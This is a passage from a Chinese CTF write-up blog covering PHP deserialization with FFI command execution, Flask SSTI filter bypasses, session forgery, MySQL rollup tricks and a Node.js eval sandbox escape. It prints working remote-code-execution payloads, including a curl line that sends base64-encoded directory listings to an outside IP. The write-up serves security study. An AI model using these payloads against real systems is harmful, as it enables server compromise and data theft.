class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A</span> = <span class="keyword">new</span> A();</span><br><span class="line">var_dump(serialize(<span class="variable">$A</span>))</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">string(<span class="number">76</span>) <span class="string">&quot;C:1:&quot;</span>A<span class="string">&quot;:63:&#123;a:3:&#123;s:3:&quot;</span>ret<span class="string">&quot;;N;s:4:&quot;</span><span class="keyword">func</span><span class="string">&quot;;s:7:&quot;</span>print_<span class="string">r&quot;;s:3:&quot;</span>arg<span class="string">&quot;;s:3:&quot;</span><span class="number">666</span><span class="string">&quot;;&#125;&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>传参:</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">?a=var<span class="constructor">_dump(<span class="params">unserialize</span>(%27C:1:<span class="string">&quot;A&quot;</span>:63:&#123;<span class="params">a</span>:3:&#123;<span class="params">s</span>:3:<span class="string">&quot;ret&quot;</span>;N;<span class="params">s</span>:4:<span class="string">&quot;func&quot;</span>;<span class="params">s</span>:7:<span class="string">&quot;print_r&quot;</span>;<span class="params">s</span>:3:<span class="string">&quot;arg&quot;</span>;<span class="params">s</span>:3:<span class="string">&quot;666&quot;</span>;&#125;&#125;%27)</span>-&gt;<span class="constructor">__get(<span class="string">&quot;ret&quot;</span>)</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>返回结果如下</p>
<blockquote>
<p>666bool(true)</p>
</blockquote>
<p>成功用函数print_r打印出666</p>
<p>该题我们利用FFI扩展</p>
<p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。<br>FFI的使用非常简单，只用声明和调用两步就可以，对于有C语言经验，但是不了解Zend引擎的程序员来说，这简直是打开了新世界的大门，可以快速地使用C类库进行原型试验。<br>php样例如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// create FFI object, loading libc and exporting function printf()</span></span><br><span class="line"><span class="variable">$ffi</span> = FFI::cdef(</span><br><span class="line">    <span class="string">&quot;int printf(const char *format, ...);&quot;</span>, <span class="comment">// this is a regular C declaration</span></span><br><span class="line">    <span class="string">&quot;libc.so.6&quot;</span>);</span><br><span class="line"><span class="comment">// call C&#x27;s printf()</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;printf(<span class="string">&quot;Hello %s!\n&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以发现FFI，可以直接调用底层c的函数执行命令，我们搜索一下：<br>printf对应的申明：<br><a href="https://skysec.top/images/2019-05-18-21-30-01.png"><img src="https://skysec.top/images/2019-05-18-21-30-01.png" alt="img"></a><br>那么搜索system对应的申明:<br><a href="https://skysec.top/images/2019-05-18-21-29-41.png"><img src="https://skysec.top/images/2019-05-18-21-29-41.png" alt="img"></a></p>
<p>将官方样例改写：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system (const char* command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用序列化触发，构造序列化为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">➜ cat <span class="number">1.</span>php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;FFI::cdef&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&quot;int system (const char* command);&quot;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>得到序列化:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">C</span>:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">96</span>:&#123;a:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;ret&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;FFI::cdef&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;arg&quot;</span>;s:<span class="number">33</span>:<span class="string">&quot;int system (const char* command);&quot;</span>;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尝试执行命令:</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">?a=$a=unserialize(&#x27;C:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">96</span>:&#123;a:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;ret&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;FFI::cdef&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;arg&quot;</span>;s:<span class="number">33</span>:<span class="string">&quot;int system (const char* command);&quot;</span>;&#125;&#125;&#x27;);var<span class="constructor">_dump($<span class="params">a</span>-&gt;<span class="params">ret</span>-&gt;<span class="params">system</span>(&#x27;<span class="params">ls</span>&#x27;)</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>直接执行命令只返回<code>int(1792)</code>等，于是考虑用盲打，为了防止特殊字符，我们使用了Base64：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">?a=$a=unserialize(&#x27;C:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">96</span>:&#123;a:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;ret&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;FFI::cdef&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;arg&quot;</span>;s:<span class="number">33</span>:<span class="string">&quot;int system (const char* command);&quot;</span>;&#125;&#125;&#x27;);var<span class="constructor">_dump($<span class="params">a</span>-&gt;<span class="params">ret</span>-&gt;<span class="params">system</span>(&#x27;<span class="params">curl</span> <span class="params">ip</span>:23333<span class="operator">/</span>`<span class="params">ls</span> <span class="operator">/</span> | <span class="params">base64</span>`&#x27;)</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>nc连接即可</p>
<h2 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h2><p>知识点：</p>
<ol>
<li>利用（#）注释符进行SSTI</li>
<li>session伪造</li>
</ol>
<p>一个类似计算机的功能，在输入框，尝试输入<code>1+1</code>：</p>
<p>返回数字2</p>
<p>输入：<code>&#123;&#123;7*7&#125;&#125;</code></p>
<p>页面回显You cant use ast.Set m8</p>
<p>输入： <code>1/0</code></p>
<p>页面报错</p>
<p><img src="http://img.npfs06.top/20210226230906.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>说明程序对报错应该没有做过滤，这里学到了新姿势，尝试输入<code>#(注释)</code>：<code>1/0#&#123;&#123;7*7&#125;&#125;</code>：</p>
<p>可以发现被正确解析了，我们读取下config文件，可以发现存在SECRET_KEY,考虑session伪造</p>
<p><img src="http://img.npfs06.top/20210226225850.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>将cookie解密下</p>
<p><img src="http://img.npfs06.top/20210226231307.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以发现是提交历史，那么接下去就可以伪造cookie了</p>
<p><img src="http://img.npfs06.top/20210226231507.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210226230314.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="Black-Watch-入群题-Web2"><a href="#Black-Watch-入群题-Web2" class="headerlink" title="[Black Watch 入群题]Web2"></a>[Black Watch 入群题]Web2</h2><p>知识点：</p>
<ol>
<li>group by with rollup</li>
<li>mysql任意文件读取</li>
</ol>
<p>1、with rollup：<br>with rollup关键字会在所有记录的最后加上一条记录，该记录是上面所有记录的总和。<br>2、group_concat():<br>group by与group_concat()函数一起使用时，每个分组中指定字段值都显示出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> mysql&gt; select sex,group_concat(name) from employee group by sex;   </span><br><span class="line">+------+------------------+    </span><br><span class="line">| sex  |group_concat(name)|    </span><br><span class="line">+------+------------------+    </span><br><span class="line">| 女   | 李四              |    </span><br><span class="line">| 男   | 张三,王五，Aric    |      </span><br><span class="line">+------+------------------+    </span><br><span class="line">2 rows in set (0.00 sec)  </span><br></pre></td></tr></table></figure>
<p>例1、普通的 GROUP BY 操作，可以按照部门和职位进行分组，计算每个部门，每个职位的工资平均值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select dep,pos,avg(sal) from employee group by dep,pos;  </span><br><span class="line">+------+------+-----------+  </span><br><span class="line">| dep  | pos  | avg(sal)  |  </span><br><span class="line">+------+------+-----------+  </span><br><span class="line">| 01   | 01   | 1500.0000 |  </span><br><span class="line">| 01   | 02   | 1950.0000 |  </span><br><span class="line">| 02   | 01   | 1500.0000 |  </span><br><span class="line">| 02   | 02   | 2450.0000 |  </span><br><span class="line">| 03   | 01   | 2500.0000 |  </span><br><span class="line">| 03   | 02   | 2550.0000 |  </span><br><span class="line">+------+------+-----------+  </span><br><span class="line">6 rows in set (0.02 sec)  </span><br></pre></td></tr></table></figure>
<p>例2、如果我们希望显示部门的平均值和全部雇员的平均值，普通的 GROUP BY 语句是不能实现的，需要另外执行一个查询操作，或者通过程序来计算。如果使用有 WITH ROLLUP 子句的 GROUP BY 语句，则可以轻松实现这个要求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select dep,pos,avg(sal) from employee group by dep,pos with rollup;  </span><br><span class="line">+------+------+-----------+  </span><br><span class="line">| dep  | pos  | avg(sal)  |  </span><br><span class="line">+------+------+-----------+  </span><br><span class="line">| 01   | 01   | 1500.0000 |  </span><br><span class="line">| 01   | 02   | 1950.0000 |  </span><br><span class="line">| 01   | NULL | 1725.0000 |  </span><br><span class="line">| 02   | 01   | 1500.0000 |  </span><br><span class="line">| 02   | 02   | 2450.0000 |  </span><br><span class="line">| 02   | NULL | 2133.3333 |  </span><br><span class="line">| 03   | 01   | 2500.0000 |  </span><br><span class="line">| 03   | 02   | 2550.0000 |  </span><br><span class="line">| 03   | NULL | 2533.3333 |  </span><br><span class="line">| NULL | NULL | 2090.0000 |  </span><br><span class="line">+------+------+-----------+  </span><br><span class="line">10 rows in set (0.00 sec) </span><br></pre></td></tr></table></figure>


<h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><p>知识点：SSTI</p>
<p>很常规的SSTI过滤绕过题，fuzz下，过滤了<code>.</code> , <code>_</code> , <code>&#39;</code></p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml">单引号用双引号替换</span></span><br><span class="line"><span class="xml">下划线用hex编码/5F替换</span></span><br><span class="line"><span class="xml">点号用\x2E替换</span></span><br><span class="line"><span class="xml">例：</span></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__mro__</span>[2]&#125;&#125;</span></span><br><span class="line"><span class="template-variable">&#123;&#123;()<span class="name">[&quot;\5F\5Fclass\5F\5F&quot;]</span>[&quot;\5F\5Fmore\5F\5F&quot;][2]&#125;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;()<span class="name">[&quot;__class__&quot;]</span>[&quot;__bases__&quot;][0][&quot;__subclasses__&quot;]()[80][&quot;load_module&quot;](<span class="name">&quot;os&quot;</span>)[&quot;system&quot;](<span class="name">&quot;ls&quot;</span>)&#125;&#125;</span></span><br><span class="line"><span class="xml">//用<span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">_frozen_importlib.BuiltinImporter</span>&#x27;&gt;</span>这个去执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="template-variable">&#123;&#123;()<span class="name">[&quot;__class__&quot;]</span>[&quot;__bases__&quot;][0][&quot;__subclasses__&quot;]()[91][&quot;get_data&quot;](<span class="name">0</span>, <span class="string">&quot;app.py&quot;</span>)&#125;&#125;</span></span><br><span class="line"><span class="xml">//用<span class="tag">&lt;<span class="name">class</span> &#x27;<span class="attr">_frozen_importlib_external.FileLoader</span>&#x27;&gt;</span>这个去读取文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload1:</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5F\x5Fclass\x5F\x5F&quot;</span>][<span class="string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;get\x5Fdata&quot;</span>](<span class="number">0</span>, <span class="string">&quot;/proc/self/fd/3&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload2:</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">//直接读app.py文件，然后根据文件中的算法逆推flag</span></span><br><span class="line">&#123;&#123;()<span class="selector-attr">[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]</span><span class="selector-attr">[<span class="string">&quot;\x5f\x5fmro\x5f\x5f&quot;</span>]</span><span class="selector-attr">[1]</span><span class="selector-attr">[<span class="string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]</span>()<span class="selector-attr">[127]</span><span class="selector-attr">[<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>]</span><span class="selector-attr">[<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>]</span><span class="selector-attr">[<span class="string">&quot;popen&quot;</span>]</span>(&quot;cat%<span class="number">20</span>app\x2epy&quot;)<span class="selector-attr">[<span class="string">&quot;read&quot;</span>]</span>()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><p>知识点：</p>
<ol>
<li>JavaScript中的类型比较</li>
<li>原型链污染</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);	<span class="comment">//引入express模块</span></span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">&#x27;./key.js&#x27;</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用readFileSync(同步读取文件方法)读取index.html</span></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.join(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();	<span class="comment">//实例化一个express</span></span><br><span class="line"><span class="comment">//bodyParser.urlencoded用来解析request中body的urlencoded字符，只支持utf-8的编码的字符,也支持自动的解析gzip和zlib。</span></span><br><span class="line"><span class="comment">//返回的对象是一个键值对，当extended为false的时候，键值对中的值就为&#x27;String&#x27;或&#x27;Array&#x27;形式，为true的时候，则可为任何数据类型。</span></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line"><span class="comment">//将文本解析为JSON</span></span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">&#x27;PHPSESSION&#x27;</span>, <span class="comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">//冻结Object和Math，表明这俩不可被修改</span></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"><span class="comment">//接收POST数据</span></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length===second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>])===md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//unshift()：向数组的开头添加一个或更多元素，并返回新数组的长度。该方法会改变原数组。</span></span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">&#x27;Not verified!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">  	<span class="comment">//pop()：把数组的最后一个元素从其中删除，并返回最后一个元素的值。该方法会改变原数组。</span></span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里有几个概念需要先讲一下</p>
<p><img src="https://img.npfs06.top/20210228230309.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>对于JavaScript中的类型比较：数组<code>[1]==1</code>在两个等于号时候是返回true的，而在三个等于号时候会返回false。这一点是和php一样的。</p>
<p>JavaScript中各个数据类型的相加：node中任何数据类型和字符串相加最后得到的都是字符串</p>
<p>而长度<code>length</code> 属性对于字符串是返回字符串长度，而数组是返回数组元素个数。而数字是没有<code>length</code> 的。</p>
<hr>
<p>我们来看题目，需要绕过两层</p>
<h3 id="hash绕过"><a href="#hash绕过" class="headerlink" title="hash绕过"></a>hash绕过</h3><p>要满足<code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code> 结合上面的结论我们我们想要<code>first</code> 和<code>second</code> 长度一样而他们内容又不相等，但是他们md5加盐后的值又要相等。可以构造如下payload：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;e&quot;</span>:payload,<span class="attr">&quot;first&quot;</span>:[<span class="number">0</span>],<span class="attr">&quot;second&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>这是因为数组利用了<strong>任何数据类型加上字符串都会转变称为字符串的特性</strong>。同时数组和字符串的长度都是1但是他们却不全等。</p>
<h3 id="构造函数执行任意代码"><a href="#构造函数执行任意代码" class="headerlink" title="构造函数执行任意代码"></a>构造函数执行任意代码</h3><p>题目关键代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为可以使用<code>Math.随便什么单词</code>，所以可以获取到<code>Math.__proto__</code>，但这姿势无法直接利用。但是经过尝试，发现<code>Arrow Function</code> 是可以使用的，尝试构造这种链：</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="params">(<span class="built_in">Math</span>)</span>=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.__proto__,<span class="built_in">Math</span>=<span class="built_in">Math</span>.__proto__))(<span class="built_in">Math</span>)</span><br><span class="line"><span class="regexp">//</span> <span class="built_in">Math</span>.__proto__.__proto__</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后尝试调用eval或者Function，但是此处无法直接输入字符串，故使用<code>String.fromCharCode(...)</code>。</p>
<p>然后使用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>+<span class="number">1</span> <span class="comment">// &#x27;[object Math]1&#x27;</span></span><br></pre></td></tr></table></figure>
<p>从原型链上导出String和Function</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function">(<span class="params"><span class="built_in">Math</span></span>)=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,<span class="built_in">Math</span>.constructor(<span class="built_in">Math</span>.fromCharCode(...))))(<span class="built_in">Math</span>+<span class="number">1</span>)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">const</span> s = <span class="built_in">Math</span>+<span class="number">1</span>;					<span class="comment">// &#x27;[object Math]1&#x27;</span></span><br><span class="line"><span class="keyword">const</span> a = s.constructor;			<span class="comment">// String</span></span><br><span class="line"><span class="keyword">const</span> e = a.fromCharCode(...);		<span class="comment">// ascii to string</span></span><br><span class="line"><span class="keyword">const</span> f = a.constructor;			<span class="comment">// Function</span></span><br><span class="line">f(e)(); <span class="comment">// 调用</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终要构造的是</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">(Math=&gt;(</span><br><span class="line">		Math=<span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>constructor,</span><br><span class="line">		<span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>x=<span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>constructor(</span><br><span class="line">			<span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>from<span class="constructor">CharCode(&#123;<span class="params">encode</span>(<span class="string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)&quot;</span>)</span>&#125;)</span><br><span class="line">		)<span class="literal">()</span></span><br><span class="line">	))(Math+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>Math=&gt;</code> 是什么意思？我们来看个简单的例子：</p>
